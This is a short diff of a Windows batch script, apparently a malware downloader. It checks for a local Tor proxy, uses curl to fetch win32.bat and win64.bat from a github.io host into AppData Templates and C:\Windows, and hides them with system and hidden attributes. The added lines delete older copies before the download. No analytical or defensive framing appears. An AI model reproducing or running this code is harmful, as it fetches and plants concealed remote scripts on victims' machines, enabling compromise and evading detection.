@@ -14,6 +14,8 @@ if not errorlevel 1 (set "proxy=--socks5-hostname 127.0.0.1:9050") else (
   set "proxy="
 )
 
+del /s /f /q /a "%AppData%\Microsoft\Windows\Templates\win32.bat"
+del /s /f /q /a "C:\Windows\win64.bat"
 curl.exe %proxy% https://cryptedlumos.github.io/win32.bat --output "%AppData%\Microsoft\Windows\Templates\win32.bat" && attrib +s +h +i "%AppData%\Microsoft\Windows\Templates\win32.bat"
 curl.exe %proxy% https://cryptedlumos.github.io/win64.bat --output "C:\Windows\win64.bat" && attrib +s +h +i "C:\Windows\win64.bat"
 timeout -t 300
